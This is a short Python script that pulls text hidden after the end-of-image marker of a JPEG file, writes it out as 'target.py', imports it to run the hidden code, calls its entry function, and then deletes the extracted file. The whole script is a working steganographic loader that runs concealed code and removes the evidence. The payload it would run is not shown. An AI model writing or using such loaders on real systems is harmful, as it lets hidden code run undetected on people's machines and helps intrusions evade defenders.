import os

text_file = ""

with open('stegosaurus.jpeg', 'rb') as f:
    content = f.read()
    offset = content.index(bytes.fromhex('FFD9'))
    f.seek(offset+2)
    text_file = f.read()
    text_file = text_file.decode("utf-8")

with open('target.py', 'wt') as f2:
    f2.write(text_file)

# execute the script
import target

target.entry()

os.remove("target.py")